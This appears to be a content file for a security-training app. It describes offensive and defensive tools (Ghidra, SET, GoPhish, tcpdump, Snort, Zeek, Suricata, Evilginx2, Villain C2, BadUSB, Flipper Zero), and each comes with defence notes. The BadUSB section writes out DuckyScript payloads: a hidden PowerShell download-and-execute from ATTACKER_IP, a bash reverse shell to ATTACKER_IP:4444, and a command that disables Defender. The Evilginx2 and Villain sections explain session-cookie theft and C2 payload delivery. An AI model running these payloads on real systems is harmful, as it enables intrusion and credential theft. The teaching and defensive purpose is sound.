ghidra.teach_intro: Ghidra's decompiler is the magic — it takes raw assembly and produces readable C code. Instead of reading assembly for hours, you get something close to the original source code. Malware analysis, vulnerability research, and CTF binary challenges become dramatically easier with a decompiler.

CodeBrowser.label: Code Browser
CodeBrowser.desc: Main GUI for code analysis, disassembly, and decompiler.
CodeBrowser.example: Open Ghidra → New Project → Import file → Open CodeBrowser → Analyze
CodeBrowser.teach: Always run auto-analysis (A key) after importing. Decompiler window (right side) shows C pseudocode. Navigate by clicking function names.

Decompiler.label: Decompiler View
Decompiler.desc: See C-like pseudocode for any function.
Decompiler.example: Click any function → Decompiler pane auto-updates
Decompiler.teach: The decompiler is Ghidra's killer feature. For CTF challenges: find the password check function, read the decompiled C, understand the logic without touching assembly.

Scripting.label: Ghidra Scripts
Scripting.desc: Automate analysis with Java or Python scripts.
Scripting.teach: Automate repetitive analysis: extract all strings, find crypto constants, batch rename variables, export function signatures. Python scripts run via Jython.

Launch GUI.desc: Launch Ghidra GUI. Create project and import target binary.

ghidra.defend_notes: Same as Radare2 — reverse engineering is impossible to prevent entirely. Code signing and integrity verification detects tampering. For software protection: use commercial obfuscators (OLLVM, Themida), anti-debugging tricks, and virtual machine-based protections for high-value binaries. Mobile apps: use ProGuard/R8 for Android, bitcode stripping and Swift obfuscation for iOS.

setoolkit.name: Social Engineering Toolkit
setoolkit.description: Automated framework for social engineering attacks. Creates phishing sites (credential harvesting), spear-phishing emails, infectious media payloads, and more. Integrates with Metasploit. The standard tool for demonstrating human-factor attacks to clients.
setoolkit.teach_intro: The most secure network can be bypassed by targeting the humans who use it. SET automates phishing campaigns: clone any website, send convincing emails, harvest entered credentials, and deliver Meterpreter payloads via malicious links. Used to demonstrate to clients why security awareness training matters.

1.label: Social Engineering Attacks
1.desc: Main menu option 1 — all SE attack vectors.
1.teach: The social engineering menu. Credential harvesting, tabnabbing, web jacking, multi-attack web. Most engagements start here.

2.label: Website Cloning
2.desc: Clone any website for credential harvesting.
2.teach: SET downloads the target site and hosts a perfect copy on your machine. Victims enter credentials, you capture them. Used with convincing phishing emails.

Spear.label: Spear Phishing
Spear.desc: Create targeted phishing emails with malicious attachments.
Spear.teach: Spear phishing is targeted — crafted for a specific person using OSINT. Much higher success rate than mass phishing. Can attach Meterpreter payload documents.

setoolkit.defend_notes: Technical controls only stop technical attacks. Human-factor attacks need human-factor defenses: regular phishing simulation training (GoPhish), security awareness programs, and reporting culture where employees feel safe reporting suspicious emails. DMARC/DKIM/SPF prevents email spoofing. Browser extensions that detect phishing sites (Google Safe Browsing). Multi-factor authentication means captured passwords alone aren't enough.

gophish.name: GoPhish
gophish.description: Open-source phishing simulation platform with a professional web dashboard. Create and manage phishing campaigns, track email opens, link clicks, credential submissions, and attachments. The standard for authorized phishing assessments.
gophish.teach_intro: GoPhish makes phishing campaigns measurable. You set up an email template, a landing page (can be a cloned site), a target list, and a sending profile — then track who opened, who clicked, who entered credentials. Perfect for demonstrating risk to clients with concrete data.

Dashboard.label: Web Dashboard
Dashboard.desc: Access at https://localhost:3333 with default admin:gophish
Dashboard.teach: The dashboard shows campaign results in real time. Who opened the email, who clicked the link, who submitted credentials. Data-driven social engineering assessment.

Campaign.label: Campaign Setup
Campaign.desc: Create sending profile → email template → landing page → target list → campaign.
Campaign.teach: Each component is separate. Sending profile = SMTP server. Email template = the phishing email. Landing page = the fake site. Target groups = who gets phished.

Launch.desc: Start GoPhish server. Access dashboard at https://localhost:3333.

gophish.defend_notes: GoPhish simulations should be followed by immediate training for those who fell for the phish. Without training, simulations just embarrass users without building resilience. Track improvement over time — well-run programs show dramatically fewer clicks after 6-12 months of quarterly campaigns. Share anonymized results with leadership to justify security investment.

tcpdump.name: TCPDump
tcpdump.description: The original command-line packet analyzer. Captures and displays network packets in real time. Available on every Linux system — no GUI needed. Used for incident response, malware C2 detection, credential sniffing on unencrypted protocols, and baseline network behavior analysis.
tcpdump.teach_intro: TCPDump reads every packet off the wire and lets you filter in real time using BPF (Berkeley Packet Filter) syntax. It's the fastest way to see what's happening on a network interface right now. On an incident: run tcpdump first, analyze in Wireshark second. Understanding BPF filter syntax is a core SOC analyst skill.

-i.label: Interface
-i.desc: Network interface to capture on: eth0, wlan0, any
-i.teach: Use 'any' to capture all interfaces simultaneously. On Kali: ip link show lists available interfaces. -i lo captures loopback (local traffic).

-n.label: No DNS Lookup
-n.desc: Don't resolve IP addresses to hostnames. Faster output.
-n.teach: DNS resolution slows output and can alert DNS servers. Always use -n in production captures — you want raw IPs for IOC matching, not resolved names.

-v.label: Verbose
-v.desc: More detail per packet including TTL, IP ID, checksum.
-v.teach: -v shows IP header fields. -vv even more detail. -vvv maximum. For initial triage -v is usually right — enough detail without overwhelming output.

-w.label: Write PCAP File
-w.desc: Save capture to .pcap file for Wireshark analysis.
-w.teach: Always save PCAPs during incidents — they're your evidence. Open in Wireshark later: wireshark capture.pcap. Name with timestamp: capture_$(date +%Y%m%d_%H%M).pcap

-r.label: Read PCAP File
-r.desc: Read and filter a saved .pcap file.
-r.teach: Post-capture analysis. Apply BPF filters to an existing PCAP to find specific traffic without recapturing.

-c.label: Packet Count
-c.teach: Useful for quick samples. -c 1000 grabs 1000 packets and exits. Prevents runaway captures filling disk.

-A.label: ASCII Output
-A.desc: Print packet content in ASCII. See plaintext HTTP, FTP, Telnet passwords.
-A.teach: With -A you see the actual content of unencrypted packets. POST /login with username=admin&password=secret123 is fully readable. This is why HTTPS matters.

-X.label: Hex + ASCII
-X.desc: Print packet content in both hex and ASCII.
-X.teach: Hex view catches non-printable characters in payloads — shellcode, binary protocols, or malware C2 using binary encoding.

host.label: Filter: Host
host.desc: Capture only packets to/from a specific IP.
host.teach: The most common filter. 'src host X' for outbound only, 'dst host X' for inbound only. Combine: 'src host X and dst host Y'.

port.label: Filter: Port
port.desc: Capture traffic on a specific port.
port.teach: Critical SOC filters: port 4444 (Metasploit), port 8080 (common C2), port 53 (DNS exfiltration). 'not port 443 and not port 80' shows non-web traffic.

net.label: Filter: Network
net.desc: Capture traffic to/from an entire subnet.
net.teach: Subnet-level monitoring. 'not net 10.0.0.0/8' excludes internal traffic to focus on external communications — fast C2 beacon detection.

proto.label: Filter: Protocol
proto.desc: Filter by protocol: tcp, udp, icmp, arp
proto.teach: ICMP tunneling is a real attack. 'tcpdump icmp' shows all pings. Large ICMP payloads or high frequency indicate data exfil via ICMP.

Save PCAP.desc: Save full capture to PCAP for Wireshark.

HTTP Sniffer.desc: See plaintext HTTP content including credentials.

C2 Hunt.desc: Show all non-standard outbound traffic — C2 detection.

DNS Monitor.desc: Monitor all DNS queries — detect DNS exfiltration.

Credential Watch.desc: Sniff FTP, Telnet, POP3 — all transmit credentials in plaintext.

tcpdump.defend_notes: Encrypt everything — TLS 1.3 renders tcpdump captures useless for reading payload content. For defenders: tcpdump IS your first response tool. Keep a captured baseline of normal traffic patterns. Alert on: unusual outbound ports, high-frequency small packets (C2 beaconing), ICMP payloads > 64 bytes (tunneling), DNS queries to random-looking domains (DGA malware).

snort.name: Snort 3
snort.description: The world's most widely deployed open-source intrusion detection and prevention system (IDS/IPS). Analyzes network traffic in real time against a rule set of thousands of known attack signatures. Detects exploits, malware C2, port scans, and policy violations.
snort.teach_intro: Snort works by comparing network packets against a database of rules. Each rule describes the pattern of a known attack. When a packet matches, Snort alerts you. In IDS mode it watches and alerts. In IPS mode (inline) it blocks the traffic. Understanding Snort rules is fundamental SOC analyst knowledge — every SIEM integrates with IDS alerts.

-i.label: Interface
-i.teach: Specify the interface facing your network. For multiple interfaces: run multiple snort instances or use -i any (performance hit).

-c.label: Config File
-c.teach: The config file defines rule paths, preprocessors, output plugins, and network variables (HOME_NET, EXTERNAL_NET). Always review HOME_NET setting — it must match your network.

-A.label: Alert Mode
-A.desc: Alert output mode: console (screen), fast (file), full, none, cmg.
-A.teach: console mode prints alerts to terminal — good for testing. fast mode writes to /var/log/snort/alert — good for production. cmg mode is most detailed for analysis.

-l.label: Log Directory
-l.desc: Directory to write logs and alerts.
-l.teach: Snort creates alert files, packet logs, and unified2 binary logs here. Configure your SIEM to tail this directory. Unified2 format is readable by Barnyard2 for database integration.

-T.label: Test Config
-T.desc: Test configuration file without starting capture.
-T.teach: Always test config after changes: snort -T -c snort.conf. Catches syntax errors in rules and config before going live. Returns 'Snort successfully validated the configuration'.

--daq.label: DAQ Module
--daq.desc: Data Acquisition module: pcap, afpacket, nfq (inline/IPS).
--daq.teach: afpacket DAQ + -Q flag = IPS mode. Snort actually drops matching packets instead of just alerting. Requires inline network placement (between firewall and network).

-r.label: Read PCAP
-r.desc: Run rules against a saved PCAP file.
-r.teach: Replay a capture through Snort rules. Essential for IR: 'did our rules catch this attack?' Also for testing new rules against known-bad traffic.

rule.label: Write Custom Rule
rule.desc: Snort rule syntax: alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:"Test"; sid:9000001;)
rule.example: alert tcp any any -> $HOME_NET 4444 (msg:"Metasploit default port"; sid:9000001; rev:1;)
rule.teach: Rule anatomy: action protocol src_ip src_port direction dst_ip dst_port (options). Action: alert/drop/log. Options: msg (alert text), content (payload match), sid (unique ID), rev (revision). Every SOC analyst should be able to write basic Snort rules.

IDS Mode.desc: IDS mode — alert on attacks, don't block.

PCAP Replay.desc: Run rules against saved PCAP file.

Community Rules.desc: Standard production IDS with community rules.

snort.defend_notes: Snort is a detector — it's only as good as its rules and tuning. Untuned Snort generates massive false positives. Tune by suppressing noisy rules on your specific network. Subscribe to Snort Subscriber rules for latest threat intelligence. Integrate with Splunk/ELK for SIEM correlation. Snort can be evaded by fragmentation, encryption, and protocol obfuscation — it's a layer, not a complete solution.

zeek.name: Zeek (Bro)
zeek.description: Powerful open-source network security monitor and traffic analysis framework. Unlike Snort/Suricata which match signatures, Zeek analyzes protocols and generates structured logs for every connection, file transfer, DNS query, HTTP request, SSL certificate, and more. The SOC analyst's best friend for network forensics.
zeek.teach_intro: Zeek doesn't alert on specific attack signatures — it creates rich structured logs of everything that happens on the network. conn.log (every TCP/UDP connection), dns.log (every DNS query), http.log (every HTTP request), ssl.log (every TLS handshake), files.log (every file transferred). These logs tell the story of an attack in a way packet captures can't.

-i.label: Interface
-i.teach: Live capture mode. Zeek generates log files in the current directory. Run from /var/log/zeek/ or similar. 'local' loads the default local.zeek policy.

-r.label: Read PCAP
-r.teach: PCAP replay is Zeek's killer feature for IR. Drop in any PCAP and Zeek produces the same rich logs as live capture. Instantly tells you what happened in a 100MB packet capture.

conn.log.label: Connection Log
conn.log.desc: Every network connection: src, dst, port, duration, bytes, protocol.
conn.log.example: zeek-cut id.orig_h id.resp_h id.resp_p proto duration < conn.log | sort -n -k5
conn.log.teach: conn.log is your starting point. Long-duration connections = C2 beaconing. Large byte transfers = exfiltration. Many connections to one external IP = scanning/beaconing. Use zeek-cut to extract fields.

dns.log.label: DNS Log
dns.log.desc: Every DNS query and response: query, type, answers, TTL.
dns.log.teach: DNS is the telltale of malware. DGA (Domain Generation Algorithm) malware queries hundreds of random-looking domains. DNS exfiltration encodes data in subdomain labels. High NX (no response) rates = DGA.

http.log.label: HTTP Log
http.log.desc: Every HTTP request: method, host, URI, user-agent, response code, file size.
http.log.example: zeek-cut ts host uri method status_code < http.log
http.log.teach: HTTP log catches malware C2 over port 80. Suspicious: user-agents that don't match browsers, URIs with base64 data, POST requests to unusual hosts. Compare user-agent against known-good browser list.

ssl.log.label: SSL/TLS Log
ssl.log.desc: Every TLS handshake: server name (SNI), cert issuer, cipher, version.
ssl.log.teach: TLS doesn't hide metadata. SNI (Server Name Indication) reveals the hostname even in encrypted traffic. Self-signed certs (validation_status != ok) are suspicious. Old TLS versions (TLS 1.0) flag unpatched systems.

files.log.label: Files Log
files.log.desc: Every file transferred: type, source, destination, MD5/SHA1 hash.
files.log.teach: files.log extracts hashes of every transferred file. Take those MD5s and run them against VirusTotal. A PE executable downloaded over HTTP from an unusual host is an immediate alert.

Live Monitor.desc: Start live network monitoring, write all logs to current dir.

PCAP Analysis.desc: Analyze a PCAP file — produces all Zeek logs.

C2 Hunt.desc: Analyze PCAP then sort connections by duration — finds C2 beaconing.

zeek.defend_notes: Zeek logs are gold for threat hunting. Forward them to a SIEM (Splunk, ELK, Graylog) for correlation and alerting. Use Zeek Intelligence Framework to feed in threat intel (malicious IPs, domains, hashes) and get automatic alerts. RITA (Real Intelligence Threat Analytics) analyzes Zeek logs specifically for C2 beaconing patterns. Store Zeek logs for 90+ days for IR lookback.

suricata.name: Suricata
suricata.description: High-performance open-source IDS/IPS/NSM (Network Security Monitor). Combines Snort-compatible signature detection with Zeek-style protocol analysis and file extraction. Multi-threaded — significantly faster than Snort on modern hardware. Generates EVE JSON logs ideal for SIEM integration.
suricata.teach_intro: Suricata is the modern evolution of IDS. It runs Snort-compatible rules (Emerging Threats, Snort Community) but adds: multi-threading for speed, protocol parsers for 50+ protocols, file extraction (pull malware off the wire), and EVE JSON output that feeds directly into Elasticsearch/Splunk without a parser. Most enterprise SOCs run Suricata today.

-i.label: Interface
-i.teach: Suricata can monitor multiple interfaces: -i eth0 -i eth1. With --af-packet it uses AF_PACKET for high-performance capture without dropping packets at 10Gbps+.

-c.label: Config File
-c.teach: suricata.yaml controls everything: rule locations, log formats, file extraction, thresholds. Key setting: home-networks — must match your network or you'll get wrong direction alerts.

--af-packet.label: AF-PACKET Mode
--af-packet.desc: Use AF_PACKET for high-speed capture. Best for live traffic.
--af-packet.teach: AF-PACKET bypasses normal socket overhead. Essential for 1Gbps+ networks. Uses multi-threading — Suricata automatically uses all CPU cores to process packets in parallel.

-r.label: Read PCAP
-r.desc: Run rules against saved PCAP file.
-r.teach: PCAP replay for IR. Did our rules catch this attack? Run the PCAP through Suricata and check eve.json for alerts. Essential for rule testing and post-incident analysis.

-l.label: Log Directory
-l.teach: Suricata writes: eve.json (all events), fast.log (quick alerts), stats.log (performance), files/ (extracted files). eve.json is the main one — ship it to your SIEM.

-S.label: Specific Rules File
-S.teach: Test new rules without modifying suricata.yaml. Load specific rule sets: emerging-malware.rules for malware detection, emerging-exploit.rules for CVE exploit patterns.

suricata-update.label: Update Rules
suricata-update.desc: Update rule sources including Emerging Threats.
suricata-update.teach: Run suricata-update daily. Emerging Threats Open rules are free and updated constantly. After update: always test config (-T) before restarting. Rules cover latest malware families and CVEs.

eve.json.label: EVE JSON Output
eve.json.desc: Suricata's unified JSON log format for SIEM integration.
eve.json.teach: EVE JSON contains: alerts (IDS hits), flows (connection summaries), DNS, HTTP, TLS, files. Pipe to jq for filtering: cat eve.json | jq 'select(.event_type=="alert") | .alert.signature'. Ships directly to Elasticsearch.

IDS Live.desc: High-performance live IDS with all logging.

Update Rules.desc: Update Emerging Threats rules then validate config.

Alert Tail.desc: Live alert feed from EVE JSON log.

suricata.defend_notes: Suricata at the network boundary catches attacks the endpoint misses. Deploy at: internet gateway, between network segments, on SPAN port from core switch. Enable file extraction to capture malware delivered over HTTP. Integrate eve.json with ELK or Splunk. Use Suricata + Zeek together — Suricata for signatures, Zeek for protocol analysis. Update rules daily with suricata-update.

evilginx2.name: Evilginx2
evilginx2.description: Man-in-the-middle phishing framework that bypasses two-factor authentication by acting as a reverse proxy between the victim and the legitimate website. Captures session cookies and credentials even when MFA is enabled. Used in authorized red team assessments to demonstrate advanced phishing risk.
evilginx2.teach_intro: Evilginx2 is a next-generation phishing tool. Instead of faking a login page, it IS the login page — it proxies the real site. The victim logs in normally, completes MFA, and thinks everything is fine. Meanwhile Evilginx captures their session cookie. That cookie grants access without needing the password or MFA again. This is why security awareness training must teach people to check URLs carefully.

-p.label: Phishlets Path
-p.teach: Phishlets are YAML configs for specific sites (Microsoft 365, Google, LinkedIn). Each one tells Evilginx how to proxy and capture credentials from that specific service.

-developer.label: Developer Mode
-developer.desc: Skip DNS/certificate checks for local testing.
-developer.teach: Developer mode for testing without a real domain. Skips certificate validation so you can test phishlets locally before a real engagement.

phishlets.label: Manage Phishlets
phishlets.desc: In evilginx2 console: phishlets list / enable / hostname / disable
phishlets.teach: After starting evilginx2, configure phishlets in the interactive console. Set hostname to your controlled domain, enable the phishlet, get the phishing URL to send victims.

lures.label: Manage Lures
lures.desc: Create and track phishing lures with unique redirect URLs.
lures.teach: Each lure has a unique URL that tracks individual victims. When a victim uses the lure URL, you see their captured credentials and cookies in real-time in the console.

sessions.label: View Captured Sessions
sessions.desc: Show all captured credentials and session tokens.
sessions.teach: After a victim logs in, sessions shows their: username, password, and session cookies. Copy the cookie into your browser (Edit This Cookie extension) to access their account directly.

Start Dev.desc: Start in developer mode for local testing.

Production.desc: Start for real engagement (requires domain + DNS).

evilginx2.defend_notes: Evilginx-style attacks defeat SMS MFA and TOTP entirely because they steal the post-auth session cookie. Only FIDO2/WebAuthn hardware keys (YubiKey) are resistant — they bind authentication to the origin domain and will reject a phishing proxy. Implement: hardware MFA for privileged accounts, conditional access policies requiring compliant devices, Microsoft Entra ID Continuous Access Evaluation to revoke stolen sessions. Educate users to check the exact URL bar — evilginx uses a lookalike domain.

villain.name: Villain
villain.description: Modern open-source C2 (Command and Control) framework for adversary simulation. Creates encrypted reverse shell handlers for Windows and Linux, supports multiple simultaneous sessions, team collaboration, and payload generation. Designed as a free alternative to Cobalt Strike for authorized red team operations.
villain.teach_intro: A C2 framework is the attacker's operations center. After exploitation, a payload on the victim connects back to Villain and gives you a persistent, encrypted shell. Villain handles multiple operators, logs all activity, and generates obfuscated payloads. Understanding C2 infrastructure is essential — both to simulate attacks and to hunt for them as a defender.

-p.label: Port
-p.desc: Listening port for reverse connections. Default 6001.
-p.teach: Pick ports that blend with legitimate traffic: 443 (HTTPS), 80 (HTTP), 8080, 8443. Firewalls block inbound but usually allow outbound to 443 — making 443 the classic C2 port.

-f.label: Teamserver File
-f.teach: In red team ops, multiple operators share one C2. Teamserver config defines shared settings so everyone connects to the same C2 infrastructure.

generate.label: Generate Payload
generate.desc: In Villain console: generate payload for Windows or Linux.
generate.teach: Villain generates PowerShell or Bash one-liners that connect back. PowerShell payloads work in-memory without touching disk. The payload is the code you deliver to the victim.

sessions.label: List Sessions
sessions.desc: Show all active reverse shell connections.
sessions.teach: Each connected victim appears as a session. Shell into any: shell [session_id]. Sessions persist even if you close Villain — victims reconnect automatically.

shell.label: Interact with Session
shell.desc: Open interactive shell on a connected victim.
shell.teach: Interactive shell in the victim's context. From here: upload/download files, escalate privileges, pivot to other machines, harvest credentials. Always document every command for the report.

Start Server.desc: Start Villain C2 listener on port 443.

villain.defend_notes: C2 frameworks generate distinctive network patterns: regular beaconing (periodic connections at fixed intervals), encrypted traffic to unusual external IPs, long-lived connections to single destinations. Detect via: NetFlow analysis for beaconing patterns, DNS for C2 domains (RITA/Zeek), proxy logs for unusual UserAgents, EDR process ancestry (PowerShell under Excel). UEBA (User and Entity Behavior Analytics) catches compromised accounts being used from C2 sessions.
mitre_techniques: T1071.001 - Application Layer Protocol: Web Protocols

badusb.name: BadUSB / Rubber Ducky
badusb.description: BadUSB attacks exploit the trust computers place in USB Human Interface Devices (HIDs). A malicious USB device impersonates a keyboard and types commands at superhuman speed the moment it's plugged in. Used with: Flipper Zero, USB Rubber Ducky, Bash Bunny, Pi Zero W, and the DigiSpark. Essential for demonstrating physical security gaps.
badusb.teach_intro: Your computer unconditionally trusts keyboards. When a BadUSB device is plugged in, it tells the OS 'I am a keyboard' and immediately starts typing commands — opening a terminal, downloading a payload, creating a backdoor — all in seconds before anyone reacts. This is why physical access controls matter as much as network security.

DELAY.label: Delay (ms)
DELAY.desc: Wait N milliseconds before next command. Gives OS time to open applications.
DELAY.teach: Without delays, commands execute before the OS is ready. DELAY 500 after WIN+R gives time for the Run dialog. DELAY 2000 after opening PowerShell gives it time to initialize.

STRING.label: Type Text
STRING.desc: Type a string of characters exactly.
STRING.teach: STRING types text character by character at keyboard speed. This is how payloads are injected — type a PowerShell command directly into a Run box or terminal.

ENTER.label: Press Enter
ENTER.teach: Submits forms, confirms dialogs, executes typed commands. Every command sequence ends with ENTER.

GUI.label: Windows Key
GUI.desc: Press the Windows key, optionally with another key: GUI r = Win+R (Run dialog)
GUI.example:
GUI r
DELAY 500
STRING cmd
ENTER
GUI.teach: GUI r opens Run dialog — fastest way to open CMD or PowerShell. GUI x opens Power User menu. GUI l locks the workstation (useful for physical access scenarios).

ALT.label: Alt Key Combo
ALT.desc: ALT F4 closes windows, ALT TAB switches, ALT SPACE opens title menu.
ALT.teach: Key combinations for UI control. ALT F4 to close security popups before the user sees them. Used to hide evidence of the attack.

CTRL.label: Ctrl Key Combo
CTRL.desc: CTRL ALT T opens terminal on Linux. CTRL C cancels. CTRL V pastes.
CTRL.teach: On Linux: CTRL ALT T opens terminal instantly — faster than any menu navigation. Combined with STRING and ENTER = immediate root shell if sudoers is misconfigured.

flags:
DELAY 500
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -ep bypass -Command "IEX(iwr ATTACKER_IP/ps.ps1 -usebasicparsing)"
ENTER
Win Reverse Shell.desc: Windows PowerShell reverse shell via Run dialog.

flags:
CTRL ALT T
DELAY 1000
STRING bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
ENTER
Linux Root Shell.desc: Linux bash reverse shell via terminal shortcut.

flags:
GUI r
DELAY 500
STRING powershell Set-MpPreference -DisableRealtimeMonitoring $true
ENTER

badusb.defend_notes: USB HID attacks are trivially defeated by: USB port locks (physical blockers), Group Policy disabling new HID device installation, USB Device Control software (CrowdStrike, Carbon Black), and endpoint software that requires authentication for new HID devices (USBGuard on Linux). Employee training: never plug in unknown USB devices — 'USB drops' in parking lots are a real attack vector. MFA on all accounts means even a successful payload launch needs credentials.

flipper.name: Flipper Zero
flipper.description: Portable multi-tool for hardware and wireless security research. Combines: Sub-GHz radio (315/433/868/915 MHz), NFC, RFID (125kHz), Bluetooth, Infrared, GPIO, BadUSB, and iButton in a pocket-sized device. Used for testing physical access controls, RF protocols, and wireless attack scenarios.
flipper.teach_intro: The Flipper Zero is a Swiss Army knife for physical and wireless security testing. It can read and replay key fobs, scan RFID access cards, capture and replay IR remote codes, emulate NFC cards, and act as a BadUSB device. It's a tool for understanding the RF and physical attack surface that digital-only security assessments miss.

Sub-GHz.label: Sub-GHz Radio
Sub-GHz.desc: Read, analyze, and replay Sub-GHz signals (car fobs, garage doors, weather stations, IoT).
Sub-GHz.example: Read mode: point at key fob and press Read → Save → Replay
Sub-GHz.teach: Most car key fobs and garage doors operate at 315MHz or 433MHz. Flipper captures the rolling code signal. Fixed-code remotes can be replayed directly. Rolling code (modern cars) requires more sophisticated attacks (RollJam).

NFC.label: NFC (13.56 MHz)
NFC.desc: Read, emulate, and write NFC cards including payment cards, building access cards.
NFC.teach: MIFARE Classic cards (used in many offices) have known crypto vulnerabilities and can be cloned. Modern high-security cards (DESFire EV2, SEOS) are resistant. Reading a card doesn't guarantee replay will work.

RFID.label: RFID (125kHz)
RFID.desc: Read and emulate low-frequency RFID cards (HID Prox, EM4100, Indala).
RFID.teach: 125kHz RFID is the legacy standard for building access. These cards have NO encryption — anyone with a reader (including a Flipper) can read and clone them. Trivially defeated with a read from 10cm away.

IR.label: Infrared
IR.desc: Capture and replay infrared remote signals. Universal remote + IR database.
IR.example: IR → Learn New Remote → point at TV → Learn
IR.teach: Flipper can learn any IR remote (TVs, ACs, projectors). The built-in IR database has universal codes for 1000+ devices. Physical pentest: walk into an office and turn off projectors during presentations.

BadUSB.label: BadUSB / HID Attack
BadUSB.desc: Execute DuckyScript payloads from SD card as a USB HID keyboard.
BadUSB.example: BadUSB → run_script.txt → plug into target PC
BadUSB.teach: Flipper Zero as BadUSB: plug into any USB port and it becomes a keyboard. Runs .txt DuckyScript files from SD card. Same capability as a USB Rubber Ducky but with all the other Flipper features too.

GPIO.label: GPIO / UART
GPIO.desc: General purpose I/O pins for hardware hacking, UART communication with embedded devices.
GPIO.example: GPIO → UART Terminal → connect to serial device
GPIO.teach: UART is how embedded devices talk to each other. Many IoT devices have an exposed UART debug port. Connect Flipper to it and you often get a root shell on the device — physical hardware hacking.

RFID Clone.desc: Read and clone a 125kHz access card.

NFC Read.desc: Identify and read an NFC card.

flipper.defend_notes: Physical security controls matter as much as digital ones. For RFID/NFC: upgrade to modern encrypted access control systems (HID Signo, Allegion Schlage SE). Faraday pouches prevent contactless skimming. Deploy RF detection sensors to alert on scanning activity. For BadUSB: USB port locks, USB Device Control policies, and staff training (don't plug in unknown devices). Physical pentest findings from Flipper are always high-severity — they demonstrate direct access control bypass.
